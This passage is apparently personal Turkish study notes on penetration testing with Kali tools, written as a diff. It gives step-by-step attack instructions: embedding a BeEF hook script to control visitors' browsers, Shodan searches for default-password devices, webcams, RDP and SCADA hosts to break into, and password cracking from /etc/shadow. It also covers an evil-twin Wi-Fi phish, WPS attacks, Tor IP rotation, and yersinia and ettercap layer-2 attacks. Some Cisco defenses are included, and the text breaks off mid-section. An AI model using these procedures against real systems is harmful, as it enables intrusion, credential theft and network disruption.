+32- Dmitry : help menüsünden bütün kullanımları görürüz. tcp portları , whois cevaplarını , netcraft cevaplarını , emailleri, subdomainleri arar
+
+33- ike-scan : Bir IP'nin vpn olup olmadığını söyler
+	
+		Kullanım : ike-scan <IP> Eğer handshake dönerse vpn'dir
+
+34- p0f : Ağ üzerindeki diğer kişilerin bağlandığı noktalar hakkında bilgi veren tool'dur
+
+	Kullanım : p0f -i iface : 
+
+35- Recon-ng : Sistemlerdeki açıkları arar :
+
+	Kullanım : 
+
+		-show modules : modülleri sıralar
+		- use <Modül> 
+		- show options 
+		- run 
+
+36- Beef Kullanımı : 
+
+	- ./beef diyerek github'dan klonladığımız projeyi başlatırız.
+	- orada <IP>:3000/hook.js dosyasını herhangi bir html dosyasına gömeriz <script src="IP:3000/hook.js"></script> olarak
+	- sonradan o linke tıklanması yeterli
+	- beef konsoldan panel url'ine gelip linke tıklanan bilgisayarlarda komutlar çalıştırılır.
+
+37- Gizlilik
+
+	========================================
+	
+	Sürekli IP Değiştirme :
+
+		-service tor start
+		- /etc/tor/torrc dosyasından cookie ve port # kaldır
+		- kendi passwordrunu tor --hash-password <password> ile al ve az önceki dosyada şifre kısmına yaz
+		- toriptables içine gir ve "python toriptables2.py -l" komutunu çalıştır
+		- python toripswitcher içine gir ve python tor_ip_switcher.py dosyasnın çalıştır. şifreni gir ve aşağıda saniyeyi belirle
+
+	=======================================
+
+	Not : Şifreli ve Korunmalı mailler için ProtonMail kullanılır
+	=======================================
+
+38- Nessus ile zafiyet tarama :
+
+	- tenable.com/products/nessus-home sitesinden nessus indirilir(debian6_amd64 dosyası)
+	- dpkg -i dosya : indirir
+	- /etc/init.d/nessusd start : uygulamayı başlatr
+	- https://localhost:8834 sitesine gidilir nessus kullanımı için
+	- new scan kısmına gelinir ve scan türü seçilir.
+	- ayarlarına bilgiler verilip ana sayfadan launch edilir
+ 
+39- Fireforce ile şifre kırmak : Html,form Authentication kullanan sitelerde geçerli
+
+	-fireforce add-ons for firefox kısmına girilip firefox'a eklenir
+	- input kısmına sağ tıklayınca fireforce ile saldırılır
+
+
+	
+40- Site Kopyalama (httrack) :
+
+	- httrack : tool'u çalıştırır
+	- proje ismi girilir
+	- nereye kaydedileceği seçilir
+	- url verilir
+	- kopyalama türü seçilir
+	- ve sonra diğer ayarlar verilip seçilir
+	- ve mirrorlama başlar
+
+41- Owasp Zap : Arayüzü vardır xd
+
+	-url verirsin ve tarama başlar
+	-biter ve incelersin alerts kısmından
+
+42- Skipfish : Owaspzap'a benzer
+
+	- skipfish -o <SaveDizin> <URL>
+	- index.html dosyasında açıkları gösterir
+
+43- WebScarab : BurpSuite'e benzer
+
+	- Sitelere bağlantı gönderildiğinde bağlantıları yakalayıp bize sunar
+	- proxy listener kısmındaki firefox'a eklenir netwowk settings'den
+
+44- wpscan ile WordPress site tarama :
+
+	- wpscan --url <URL> --enumerate <Mode(p,t,u,tt)> : Taramayı başlatır. modları help menüsünden görebiliriz
+
+45- HexorBase : Veritabanlarına erişim ve bruteForce saldırıları yapmaya yardımcı olur
+	
+	- ip adresi ve port istenir
+	- portu nmap taramalarından görebiliriz
+	- userlist ve passlistler verilir.
+	- saldırı başlar 
+
+	
+46- Shodan : IoT teknolojileri ve bunların açıkları başta olmak üzere bir çok işlevi olan internet arayüzlü bir kaynaktır
+
+	- default password araması ile default passworde sahip olan IP adreslerini gösterir ve bağlantı sağlar
+	- "Server: Virata-EmWeb" hp | country:"TR,EN.." : HP marka yazıcıları gösterir ve çoğuna direkt olarak bağlanabiliriz
+	- product:apple tarzı aramalar ile belirli marka ürünleri arayabiliriz 
+	- webcam araması yapılırsa webcamlara bağlanılabilir ("Server: IP Webcam Server" has_screenshot:true şeklinde aramalar vardır)
+	- admin+1234 port:8080 country:TR gibi bir arama ile default pass ile portlara sızma işlemi gerçekleştirilebilir
+	- MQTT verileri akıllı ev sistemlerinde iletişimlerinde kullanılan veri türüdür. Bu iletişime sızmak için yaptığımız arama "MQTT Connection Code:0 country:..." . Sızmak için mqtt connection sızma olarak aratabiliriz
+	- explore kısmından databases'e gelerek database'leri inceleyebiliriz.
+	- explore kısmından Industrial Control Systems kısmından aramalar yaparak oradaki ürünleri de inceleriz
+	- port:3389 araması ile uzak bağlantı bilgisayarlarına ulaşabiliriz
+	  ip adresi alınıp "rdesktop <IP>" komutu çalıştırılırsa bağlantı yapılabilir
+	- scada sistemi çoklu kontrol sistemidir. search kısmına scada yazılır ise sonuçları inceleyebiliriz
+	- vuln:cve-2014-0160 tarzı bir arama ile açıkları aratabiliriz ve çıkan IP adreslerine msfconsole ile saldırı yapılabilir
+		Not: CVE Details sitesinden güncel açıkları ve eski açıkları inceleyip haklarında bilgi alabiliriz
+	
+	===========================================================================
+
+
+	Shodanı Kaliye Entegre Etmek :
+
+		- pip install shodan / pip3 install shodan
+		- shodan init APIKEY
+		- internetteki kullanımların aynısını help menüsündeki komutlar ile yapabiliriz
+		
+	
+	MsfConsole üzerinden Shodan Kullanımı :
+
+		- msfconsole ile konsol açılır
+		- use auxiliary/gather/shodan_search
+		- show options 
+		- set SHODAN_APIKEY <APIKEY>
+		- set QUERY <Aranacak şey>
+		- run 
+		- Ve sonuçlar listelenir
+
+	Shodan Verilerini Kaliye AKTARMAK :
+
+		- shodan host <HEDEFIP>
+		- shodan host --history -o dosya.json.gz <HedefIP> : Hedefdeki verileri alır ve kaydeder uzantı kısmi olarak zorunludur
+		- shodan parse dosya.json.gz : Verileri parse eder
+		- shodan convert dosya.json.gz images : Dosyadaki verileri fotoğraflara dönüştürür	
+
+	Shodan Üzerinden İstatistiksek Veri almak :
+
+		- shodan stats --facets <QUERY> : Dönen sonuçları istatistiksel olarak gösterir
+
+	Shodan ile Network Trafiği izleme :
+
+		- shodan alert create "<isim>" <IP/s> : alert oluşturur ("dns" 8.8.0.0/16)
+		- shodan alert list : alertleri listeler
+		- shodan stream --alert <ALERTID> : Ağ trafiğini gösterir
+		- shodan alert remove <ALERTID> : alerti siler
+
+	
+	NOt: Shodanda port:2379 araması Bize ETCD açığı bulunan sonuçları döndürecektir
+
+
+
+
+
+47- golismero : bu tool zaafiyet analizi için kullanılan önemli toollardan biridir
+	
+	
+	- golismero scan <URL> : Bir url üzerinden zaafiyet analizi yapar. Diğer toolları ortak çatıda toplayan bir tooldur
+	- golismero help menüsünde diğer kullanımlar görünür
+
+48- lynis : Bu tool Linux/Unix üzerinde zafiyet analizi yapan bir tooldur
+
+	- lynis audit system : Kendi Ip adresimizde zaafiyet analizi yapar
+	- lynis system remote <IP> : Başka bir bilgisayar üzerinde zaafiyet analizi yapar
+
+49- nikto : Web servisler üzerinde zaafiyet analizi yapar 
+
+	- nikto -h <IP,Url> : taramayı başlatır
+
+50- unix-privesc-check : Linux/Unix üzerinden zaafiyet analizi yapar. Genellikle sunucuları korumak veya scanlemek için kullanılır
+
+	- unix-privesc-check standart/detailed : Taramayı başlatır ve bütün sistemi tarar
+
+51- Şifre Saldırıları :
+
+
+	================================================================
+
+	- cewl : Wordlist oluşturma tool'udur. cupp.py'ye benzer bir site profil veya link vererek olası şifreleri bizim için çıkarır
+	- cewl <www.URL> -w /directory : Wordlisti oluşturur
+	- "-e" komutu ile e postaları da çıkarmayı deneyecektir
+	
+	===============================================================
+	
+	-hashcat : hashlenmiş şifrelere saldırı yapan bir tool'dur	
+	- hashli şifre bir dosyaya konur
+	- bir wordlist dosyası hazırlanır. Hashcatte default olarak bulunan modlar da vardır
+	- hashcat -m 0(yukarıdakiŞifrelemeTürüID) /şifredosyadirectory /wordlistdirectory
+
+	===============================================================
+
+	Not: Hash identifier toolu ile hashin tipini görebiliriz
+
+	- john : Hashli password attackları için kullanılan tooldur
+	- john --list=formats : formatları listeler
+	- john --format=<ÜsttekiFormat> --wordlist=/wordlistDirectory /şifreDirectory
+	Not: bruteforce saldırılarında durdurup devam etmek için yapacağımız kullanım :
+		john --wordlist=/wordlistDirectory --stdout(herSAtırıOkur) --session=herhangiBirİsim | aircrack-ng -w - -b <BSSID> /dosya.cap
+		john --restore=sessionİsmi | aircrack -w - -b dosya.cap: Bu komutlarda ile de kalınan yerden devam eder (Çıkmak için q tuşunu kullan) 
+	===============================================================
+
+	-johnny : Bir makinedeki kullanıcıları ve şifrelerini kırmak için kullanılan bir tooldur
+	- /etc/passwd ile /etc/shadow dosyaları birbiri ile birleştirilir
+		unshadow /etc/passwd /etc/shadow > /NewDirectory  komutu ile bunu hallederiz. tool hakkında bilgiyi unshadow diyerek görebiliriz
+	-yeni dosyayı verdiğimizde direkt olarak şifrelere saldırı yapacaktır
+
+	================================================================
+
+	-medusa : Servislere yönelik bruteforce saldırıları için kullanılır 
+	- username ve passwd için wordlistler oluşturulur
+	- targetın 21 numaralı portu açık mı diye bakılır
+	- medusa -h <TargetIP> -M ftp -U /userwordlist -P /passwordlist : saldırıyı başlatır
+
+52- İstismar araçları :
+
+
+	-armitage : arayüzü olan güzel bir tool?
+	- alt tarafta msfconsole kullanılabilir
+	- sol üst tarafta modüller vardır
+	- modüle tıklandığında options kısmı açılır ve bilgileri set ederiz
+	- launch kısmına tıklandığında ise saldırıyı başlatır
+
+	==============================================================
+
+	- setoolkit : tool'u başlatır
+	- ilk menüdeki seçeneklerden bir tanesi seçilir
+	- seçenekler seçilip ayarlar set edilir
+	- Lhost port gibi ayarlar verilir
+	
+53- Wordlisti kaydetmeden saldırı yapmak :
+
+	mantık : crunch'ın çıkış dosyasına çıkış vermeden john'a veriyoruz john'dan ise çıkışı bruteforce saldırılarına verilir
+	Kullanım : crunch 10 10 | john --stdin --session=Değişken --stdout | aircrack ng -w - -b Bssid dosya.cap
+		 yeniden başlamak için değiştirmemiz gereken kısım john --restore=Değişken demek olacak
+
+
+54- Şeytani İkiz Saldırısı :
+
+	Mantık : Saldıracağımız ağı kopyalayıp deauth ile ona bağlanmasını sağlarız ve şifreyi isteriz
+
+	- git clone https://github.com/wi-fi-analyzer/fluxion
+	- cd fluxion
+	- cd install
+	- bash install.sh
+	- bash fluxion.sh
+	- ch seçilir (hepsi de alınabilir. tek bir ch'de)
+	- tarama yapıldıktan sonra saldırılacak modem seçilir
+	- saldırı tipi seçilir
+	- handshake verilir
+	- ssl sertifika oluşturulabilir
+	- web arayüzü açılır
+	- modem tipi seçilir biliniyor ise
+	- program modeme bağlı herkese deauth yapar ve internete erişen kişilerden şifre ister
+	- yazıyı güncellemek için /tmp/TMPlux/data/index.html dosyasına gireriz ve oradan yazıları değiştirebiliriz
+
+
+55- WPS ile hacking :
+
+	-monitor moda geç
+	- wash -i wlan0mon : WPS modemleri gösterir
+	- aireplay-ng --fakeauth Sayı <targetModemBSSID> -h <KendiBSSIDmız> wlan0mon : Bunu yaparken airodump ile izlenmesi de gerekebilir. Kendimizi yetkilendirip alttaki saldırıyı başlatırız
+	- reaver --bssid <BSSİD> --channel <CHıd> -i wlan0mon -A 
+	 
+	
+
+
+
+56- Cisco :
+
+	
+	- GNS3 : Graphical Network Simulator - Cisco ürünlerinin simüle edilmiş halidir
+	- Kurulumu yaptıktan sonra sıkıntı çıkarsa tools + dhcp etkinleştir
+	===========================================================
+	Switch Ekleme(Sanal) : Modemdeki bilgileri istediğimiz cihazlara gönderdiğimiz bir anahtarlama aracıdır
+	-GNS3 üzerinden Cisco sanal switchi seçip indirdiğimizde ekrana sürükleyerek projeye dahil edebiliriz
+	
+	===========================================================
+	Router Ekleme (Sanal) : Router, aynı ağ iletişim kurallarını kullanan iki bilgisayar ağı arasında veri çerçevelerinin iletimini sağlayan ağ donanımıdır. Yönlendirme için OSI yedi katman modelinin üçüncüsü olan ağ katmanı kullanılır
+	- Router sürücüsü yüklendikten sonra seçilerek projeye dahil edilir
+	
+	==========================================================
+	Kaliyi GNS3'e bağlama : Kali ağ ayarlarını genel sürücü yaparsak preferences üzerinden Vbox VMS kısmından kaliyi ekleyerek projeye dahil edebiliriz
+
+
+	==========================================================
+
+	CAM(Content Adressable Memory) Saldırısı : CAM switchlerin içindeki mac adreslerini tutan bir tablodur
+						   Bu tablonun belirli bir sınırı vardır. Bu sınır ciscoda 130-140k civarlarındadır
+						   Cihazların birbiri ile iletişim kurması için sürekli Broadcast atmasını engelelr
+						   Hub cihazı gibi her cihazın birbiri ile iletişimini sağlamaktan ziyade tünelleme işelvi görür
+						   Eğer bu tablodaki sınır aşılırsa switch işlevini kaybedip broadcast atmaya başlar
+			Not: Saldırıda yapacağımız işlem ise "macof" toolu ile 155k'dan fazla mac adresi üretip CAM'in taşmasını sağlamaktır
+
+		Saldırı :
+
+			- GNS3 ve Putty açılır(switch üzerinden)
+			- show mac address-table komutu ile mac adresleri listelenir
+			- Kaliden macof toolu ile "macof" komutu ile switche sürekli olarak mac gönderilir
+			- GNS3 üzerinden bağlantıya sağ tıklayıp capture dersek wireshark'ı açacaktır buradan istekleri ve paketleri inceleyebiliriz
+		
+		Savunması:
+	
+			- Belirli bir sayıdan fazla mac gelirse bir adresten önce kayıt işlemi kesilir ve saldırı devam ederse port kapatılır
+			- Putty'e geçilip admin yetkisi alınır
+			- "enable" komutu ile admine geçilir
+			- Portta değişiklik yapmak için configurasyon moduna geçilir
+			- "conf t" : konfigurasyon moduna geçer
+			- Hangi portta ayar yapılacağı seçilir
+			- interface "gigabitEthernet 0/0" port ismidir : Bu portu kullanacağız deriz
+			- Port güvenliğini açmak için access moduna geçilir
+			- switchport mode access komutu ile sağlanır
+			- switchport port-security : Port güvenliği aktif edilir
+			- switchport port-security maximum <3(INT)> : porta bir kural atarız
+			- Kaydedilen mac adreslerini kalıcı yapmak için switchport port-security mac-address sticky komutu kullanılır
+			- switchport port-security violation shutdown : Verdiğimiz kural ihlal edildiğinde yapacağı şeydir. Burada portu kapatma komutu verdik
+			
+			- portu açmak için aynı işlemler yapılır
+			- conf t moduna geç
+			- interface seç
+			- "no shutdown" komutu ile port yeniden açılır
+			- Bunu otomatik yapmak için errdisable recovery cause psecure-violation 
+			- Portu ne zaman açacağını söylemek için errdisable recovery interval <Saniye>
+
+		Battal Notu :
+
+			conf t = konfigirasyon moduna geçerek bazı port ayarları yapacağız
+			interface gigabitEthernet 0/0  = diyerek bağlantının bağlı olduğu arayüzü seçmemiz gerek
+			switchport mode access = port güvenliğini açmak için akses moduna geçiş yapmamız gerekiyor
+			switchport port-security = port güvenliğini aktif hale getiriyoruz
+			switchport port-security maximum 3 = kaç tane mac adresi geçebilsin onu ayarlıyoruz
+			switchport port-security mac-address sticky = öğrendiği mac adreslerini kalıcı hale getirmeye yarar
+			çünkü switchler ortalama 5 dakika tutar ve geri siler.
+			switchport port-security violation shutdown = bir saldırı veya ihlal olduğunda hangi aksiyonu gerçekleştirmesini söylüyoruz
+			burada da shutdown diyere portun kapatılmasını söylüyoruz.hadi gelin şimdi deneyelim
+			show interfaces gigabitEthernet 0/0 = bunu yazarak portun kapalı olduğunu görüyoruz
+
+			şimdi portumuzu tekrar açalım
+			conf t
+			interface gigabitEthernet 0/0
+			shutdown =diyerek kapattığımız portu şimdi de 
+			no shutdown = diyerek açıyoruz
+			errdisable recovery cause cause psecure-violation = hataya düştüğünde bunu kurtar nedeni port güvenliğiyle portu düşürdüm
+			errdisable recovery interval 50 = atak veya ihlal olup port kapandıysa 50 saniye sonra tekrar aç 
+			ama hala atak devam ediyorsa kapatır
+
+	==============================================================
+
+	CDP Saldırısı : CDP sadece cisco cihazalrda çalışır. Bir CDP bütün switclerin birbiri ile haberleşmesini sağlar
+			60 saniyede bir mesaj gönderirler. 60 saniye sonra mesaj gönderilmezse ve 180 saniye boyunca mesaj gelmezse oradaki bağlantı silinir
+			Saldırı yaparken de sürekli mesaj göndererek sistemi çökertmeye çalışırız 
+
+		
+		-Putty açılır
+		- "enable" komutu ile admine geçilir
+		- "show cdp neighbors" komutu ile kaç CDP olduğunu gösterir 
+		- "show cdp traffic" CDP traffiklerini gösterir verilerin girişini çıkışını etc
+		- "show cdp" ile sürelerin detaylarını gösterir
+
+		Saldırı:
+		- yersinia -G
+		- Launch attack kısmına gelip flooding CDP table kısmına basıp "OK" dersek switche sürekli mesaj gönderecektir
+		- Lİst attacks kısmından saldırıyı durdurabiliriz
+		- tekrardan traffic ve neighbors bilgilerine bakarsak gönderdiğimiz paketlerin etkilerini görebiliriz
+		
+		Savunma :
+		- clear cdp table : bütün cdp tablolarını boşaltır
+		- show cdp traffic içindeki veriler silinmeyecektir
+		- Burada ise cdp kapatılır
+		- conf t
+		- interface range gigabitEthernet 0/0-2 : Burada birden fazla interface seçebileceğini söyledik
+		- no cdp enable : Bununla cdp kapatılır
+
+	Battal Notu :
+
+		show cdp neighbors = cisco switch komşularını gösterir
+		show cdp traffic = cdp trafiğine bakar
+		show cdp = paket gönderim sürelerini gösterir
+
+		kali de
+		yersinia -G
+
+		saldırıdan sonra 
+		show cdp traffic bakarız
+		show cdp neighbors komşulara bakarız
+
+
+		önleme
+		clear cdp table = cdp tablosunu temizler
+		cdpyi kapatırız
+		conf t 
+		interface range gigabitEthernet 0/0-2
+		no cdp enable
+
+		saldırı yapılır ve ardından tekrar trafik var mı kontrol edilir
+
+	================================================================
+
+	DHCP saldırıları : DHCP ağdaki cihazlara IP adresi , ağ maskesi , ağ geçidi ve dns adresleri otomatik olarak atayan bir sistemdir
+			   Bir ağdaki cihazları tek tek gezip benzer IP parametlerinin defalarca girilmesini engelleyip zamandan tasarruf sağlar
+			   
+		Saldırı yaparken ise sunucuya kendimizi sahte bilgisayarlar olarak gösterip gerçekmiş gibi mac adresleri yollayacağız. Bir sürü IP adresi alacağız
+		Amacımız ise DHCP'yi tamamen doldurtuktan sonra sahte bir sunucu ile bağlanmak isteyenlere kendimiz IP vermemizdir
+
+	
+		Saldırı Yapılışı :
+
+			- Putty açılır
+			- Önce DHCP sunucusu oluşturulut
+			- enable
+			- conf t
+			- interface vlan 1 :
+			- ip address 192.168.1.10 255.255.255.0 : IP ve Netmask verilir
+			- no shutdown / nosh ile açarız
+		
+			- Şimdi DHCP ayarları yapılır
+			-conf t
+			- ip dhcp pool <İsim>
+			- network 192.168.1.0/24
+			- default-router 192.168.1.1 : Dağıtıcının Ip adresi verilir
+			- dns-server 8.8.8.8 : Dns verilir
+			- lease 4(Gün) 12(Saat) 45(Dakika) : Kira süresi belirlenir
+		
+			-Statik Ip adresi oluşturulur
+			- conf t
+			- ip dhcp excluded-address 192.168.1.1 192.168.1.12 : IP başlangıç bitiş noktalarını seçer
+		        - show ip dhcp pool ile bilgileri görebiliriz
+			
+
+			-Bilgisayar bağlanır ve console'u oradan açıp
+			- ip dhcp komutu ile ip adresi alırız
+
+			-Kali
+			- DHCP kaliyi modem olarak görüp IP adresi olarak 192.168.1.1 vermiş olabilir
+			- ifconfig eth0 192.168.1.6/24 komutu ile ıp adresimizi değiştirebiliriz
+			- ifconfig eth0 down ve up yaparız
+
+			-Cisco Putty
+			- show ip dhcp binding ile verilen Ip adreslerini görebiliriz
+			
+
+			Saldırı yapma: (Kali) :
+			- yersinia -G
+			- DHCP  sendind DISCOVER packet ile saldırıyı başlatırız
+			- Ve saldırı sonrasında switch devre dışı kalacaktır
+			
+			-Kendi sahte sunucumuzu DHCP sunucu yerine koymak
+			- yersinia'da DHCP kısmına creating DHCP rogue server deriz
+			- ServerID : Kendi IPmiz(DHCP'den alınan)
+			- Start IP ve End IP verilir (192.168.1.55 ve 192.168.1.100)
+			- subnet Mask olarak 255.255.255.0 veririz
+			- Router ve DNS servera ise kendi Ip adresimizi verip kendimize bağlarız
+			- domain name ise rastgele verilebilir
+			- Sonrasında yeni bir cihaz bağlanmak istediğinde bizim cihazımıza bağlanacaktır
+
+		Savunması :
+	
+			- DHCP sunucusunun portunu güvenlikli port olarak atarız
+			- conf t
+			- ip dhcp snooping vlan1
+			- interface gigabitEthernet 1/2
+			- ip dhcp snooping trust : Güvenilir port olduğunu belirtir ve yeni DHCP verimlmek istendiğinde istemez
+			- show ip dhcp snooping ile güvenilir DHCP hangisi görülebilir
+			
+
+		Battal DHCP Nedir :
+				DHCP, ağdaki cihazlara ip adresi, ağ maskesi, ağ geçidi ve dns adresleri gibi bilgileri otomatik olarak atamak için kullanılan servistir. 
+				Bir ağda bulunan cihazlara tek tek gezip benzer ip parametrelerinin defalarca elle girilmesini engelleyerek zamandan tasarruf etmeye yarar.
+				Bu sayede sistem yöneticisinin işini kolaylaştırır.
+				DHCP sunucusu    
+				IP adresi
+				Alt ağ maskesi(subnet mask)
+				Ağ geçidi(Getaway)
+				DNS adresi
+				bilgilerini yöneten ve istemcilerine belirli bir kira karşılığında otomatik olarak sağlayan sistemdir.
+
+				Kira süresi, istemcinin almış olduğu IP adresini kullanabileceği süreyi gösterir.
+
+				İstemci, bağlı olduğu DHCP sunucusundan ayrıldığında, ne kadar süre sonra tekrar bağlanırsa aynı IP’yi alabileceği, kira süresi bölümünden belirlenir.
+	
+				Örnek verirsek;
+
+				50 bilgisayarı olan şirket olsun. Bu bilgisayarların hem internet bağlantısı olacak hem de birbirleri arasında haberleşecekler. Bunun için;
+
+				Öncelikle bir IP bloğu tanımlanması,
+				Bu IP bloğundan her bilgisayara, birbirinden farklı IP adresi atanması gerekir.
+				Şirkette DHCP sayesinde, 50 bilgisayara yukarıdaki bilgiler otomatik olarak atanır.
+				DHCP sunucusundan faydalanılmazsa, 50 bilgisayar için tek tek gezerek yukarıdaki işlemlerin yapılması gerekir.
+
+				Modemlerimizde, DHCP sunucusundan IP alan istemcilerin listesini, MAC adresi, isim ve kira süresiyle birlikte, LAN menüsüne tuşlayarak görebiliriz.
+
+
+
+		Battal DHCP Saldırısı :
+
+					enable
+					conf t
+					interface vlan 1 = dhcp sunucu ip adresi dağıtabilmesi için interface tanımlaması yapıyoruz
+					ip address 192.168.1.10 255.255.255.0
+					no sh = no shutdown oluyor buda o ip adresinin kanalı açmaya yarıyor
+
+					conf t
+					ip dhcp pool HAVUZ = havuz adında dhcp sunucu oluşturduk
+					network 192.168.1.0 /24 = ağımızı oluşturuyoruz
+					default-router 192.168.1.1 = modemin ip adresini oluşturuyoruz
+					dns-server 8.8.8.8 = google dnsini veriyoruz
+					lease 4 12 45 = gün saat ve dakika olarak yazıyoruz bu süre zarfı boyunca ip adreslerini atama yapacak
+					network diye oluşturduğumuz bağlantı noktasından itibaren
+					end
+
+					conf t 
+					ip dhcp excluded-address 192.168.1.1 192.168.1.12 = statik olarak atama işlemi yapabiliriz bu şekilde
+					end
+
+					show ip dhcp pool = girdiğimiz bilgileri görebiliriz
+
+
+
+
+					sanal pc den 
+
+					ip dhcp = diyerek ip adresinin dhcp den almasını sağlarız
+					DDORA yazısını görürsek başarılı olduğunu anlarız
+
+
+
+					switch de
+
+					show ip binding = bunun ile atanan ip adreslerini görebiliriz
+
+		==================================================================================
+
+		ARP saldırıları : Bilgisayarlar yerel ağda birbirleri ile haberleşmek için 48 bitlik Mac (Fiziksel) adresleri kullanırlar. TCP/IP protokolleri ise veri gönderip almak için
+				  32 Bitlik IP adresi kullanırlar. Yerel ağda haberleşmek ve veri alışverişi yapmak için cihazın Mac adresi bilinmelidir. IP'si bilinen cihazın Mac adresini bulmak için kullanılan protokol ise ARPtır(Adress Resolution Protocol)		
+				  Mac adresleri 12 haneden Hexadecimal kodlarla yazılır.İlk 3 kolon üretici firmayı son 3 kolon ise cihazı temsil eder 
+				  Arp spoofing attacklarında ise ARP requeste target'ın IP'sini verip Mac olarak kendi Mac adresimizi veririz. Ve bu isteği router'a göndeririz
+				  Arp reply'e ise modem IP'sini verip yine kendi mac adresimizi vererek ARP paketlerini manipüle ederiz
+
+			Saldırı için :
+
+				- GNS3'teki 2 sanal bilgisayara ip adresi atanır konsollarından ip 192.168.1.?
+			 	- Kalide ifconfig etho IP/24 yaparız
+				- Bağlantının varlığından emin olmak için diğer 2 bilgisayara ping atarız
+				- ettercap -G ile tool'u başlatırız
+				- scan for host ile ağdaki hostları ararız
+				- Hostlar targetlara eklenir
+				- MITM menüden ARP poisoning seçilir ve saldırı başlatılır
+				
+			Savunma İçin :
+
+				-Switch Console :
+				-Mac adreslerinde ve IP adreslerinde değişikliği DHCP sunucusu üzerinden yapar isek ARP saldırıları için gelen ARP isteği devre dışı kalacaktır
+				- conf t
+				- ip dhcp snooping vlan1 
+				- ip arp inspection vlan1 : ARP isteklerini sadece DHCP sunucusu yapabilir ayarını verir
+				- interface gigabitEthernet 2/0?
+				- ip dhcp snooping trust  : DHCPyi güvenilir cihaz olarak seçtik
+				- ip arp inspection trust : DHCP'yi Arp isteği için güvenilir cihaz olarak seçer
+
+	====================================================================
+	
+	Spoofing : Kendimizi diğer switchlere switch gibi gösterip bir switch yetkisi kazanabildiğimiz saldırılardır
+
+		Saldırı :
+
+			-Kali
+			- yersinia -G
+			- DTP(Dynamic Trunk Protocol) kısmı seçilir
+			 Not : Trunk var mı emin olmak için show interfaces trunk komutu ile varlığını sorgularız 
+			- Launch attack kısmında enabling trunking seçilir ve saldırı başlatılır(Tekrardan trunk sorgusu atıldığında bu sefer bağlantı olduğunu görürüz)	
+			
+		Savunma :
+			
+			- İşlem Manuele alınırsa sorun çözülecektir ama çok iş gücü gerektirecektir
+			- conf t
+			- interface gigabitEthernet 0/0?
+			- switchport mode access : Access moduna geçilir (Manuel)
+			- switchport nonegotiate
+
+	=============================================================
+
+	VTP(VLAN Trunking Protocol) Saldırısı : VLan , Sanal Yerel Ağ alanıdır. Yerel ağ içerisinde çalışma gruplarını oluşturmak, yerel ağı anahtarlarla bölmektir
+						VTP ise bir cisco ağındaki senkronizasyonu yapar. Buradaki haberleşmeyi VTP sağlar. Sadece Cisco ürünlerde vardır.
+						Bir anahtarda oluşturulan vlanların diğer anahtarlara otomatik olarak aktarılmasını sağlayan VTP kullanır
+					3 Modu vardır : Server Client ve Transparent. Varsayılan olarak Server modundadır. VLAN VLANID ve VLANname bilgilerini aktarır
+							Server sunucusu Vlan oluşturabilir silebilir düzenleyebilir. Bağımsız senkronizasyonu vardır. VTP tanıtımlarını iletebilir
+							Client VLAN üzerinde yetkisi yoktur. Bağımsız senkronizasyon yapar ve VTP iletir
+							Transparent ise Sadece Localde Vlan yetkisi vardır. Bağımsız Senkronizasyonu yoktur. VTP iletimi mevcuttur
+
+			Saldırı : VTP yapılandırması sırasında birbirleri ile iletişimleri için kullandıkları parolalar vardır. Eğer yoksa saldırı yaparız. Ya da kırarız				
+
+
+			Saldırı:
+				-enable moda geçilir
+				- conf t
+				- vtp mode server : VTP server çalışır
+				- vtp domain <Name>
+				- vlan 5 : Vlan oluşturulur ve ID'si verilir
+				- vlan 10 : yenisi
+				- vlan 15 : bir yenisi daha
+				- show vtp password ile şifre durumuna bakabiliriz
+				- show vlan brief : vlanları listeler
+				
+				- KALI
+				- Saldırı için Trunk yetkisi almamız gerekir burada spoofing DTP saldırısı yaparız
+				- yersiniada VTP kısmına geliriz
+				- Saldırı tipini seçip paket hazırlarız
+				- Sonra sending packet kısmından paketi yollarız
+
+				
+		Savunma :
+
+			 Yöntem 1: Transparent Moda geçilir
+				- conf t				
+				- vtp mode transparent
+				
+				
+
+			 Yöntem 2: şifre verilir
+				-conf t
+				-vtp password <Şifre>	
+
+
+	===============================================================
+
+	STP(Spanning Tree Protocol) Saldırısı : Switchlerin haberleşmesi sırasında oluşacak döngüleri önleyen bir protokoldür
+						Kullanılması gereksiz gördüğü portu kapatır
+						Bir admin switch seçilmesi gerekir karışıklık çıkmaması için
+						Bunun için siwtchler birbirine Id MAc ve İsimlerini gönderirler. ID'si en küçük olan switch admin seçilir
+						Idler aynı olur ise Mac adres bpyutu en küçük olan seçilir
+						
+			Saldırı : Id veya Mac adresi diğerlerinden küçük bir sahte switch yerine geçip admin yetkisini isteriz
+
+			Saldırı :
+				
+				-GNS3'den 2. switch oluşturulur
+				- 2 tane bağlantı kurulu switchler arasında
+				- enable moda geçilir
+				-  show spanning-tree komutu ile root switch'in Id ve Mac adresine bakabiliriz
+				- Kali
+				- yersinia -G
+				- STP kısmına geçilir
+				- Launch attack kısmından claiming root role işaretlenir
+
+			Savunma :
+
+				- Cisco Switchlerin portları dışındaki bütün portlar yasaklanır ve admin rolü üstlenemez
+				- enable moda geç
+				- conf t
+				- int gi0/0
+				- spanning-tree guard root : Sadece bağlantıların root yetkisi alabilmesini sağlar
+
+
+
+
+
+
+
+
+
+57- python ile tool yazımı :
+
+	Tool 1 - Mac Changer :
+
+		-Kullanılacak kütüphaneler "import subprocess", "import optparse"
+
+		- subprocess.call(["ifconfig",inter,"down"])
+		  subprocess.call(["ifconfig",inter,"hw","ether",mac_adres])
+		  subprocess.call(["ifconfig",inter,"up"]) : Şeklinde kullanımlar ile command line kodu işleyebiliriz
+
+		- parse = optparse.OptionParser()
+		  parse.add_option("-i","--interface", dest="interface",help="interface değiştirme")
+		  parse.add_option("-m","--mac",dest="mac_adress",help="yeni mac adres")
+		  (girisler,argumanlar)=parse.parse_args() : parse'dan gelen argümanları alır ve bizim değişkenlerimize açar
+		  inter = girisler.interface
+		  mac_adres= girisler.mac_adress
+		  print("Değiştirme işlemi tamamlandır")
+
+		Not: Bu kirli kodu fonksiyonlar temeline döküp daha temiz bir kodla çalışabiliriz
+	
+		- ifconfig = subprocess.check_output(["ifconfig",interface]) : gibi bir kullanım ile outputu bir değişkene atayabiliriz
+                  sonrasında regex ile sadece mac kısmını alıp gösterebiliriz
+
+	
+
+	Tool 2 - Ağ Tarayıcısı(netdiscover'a benzer) :
+
+		- Mantık : Bir ağa bağlı olan cihazlar hakkında bilgiye ulaşmak için IP adreslerini brute forceluyoruz. Broadcast'e geri dönen cihazlar ise MAC adresini de bize veriyor.	
+		- Kullanılacak kütüphaneler "import scapy.all as scapy"
+	 
+		- ARP isteğini yollamak için :
+		
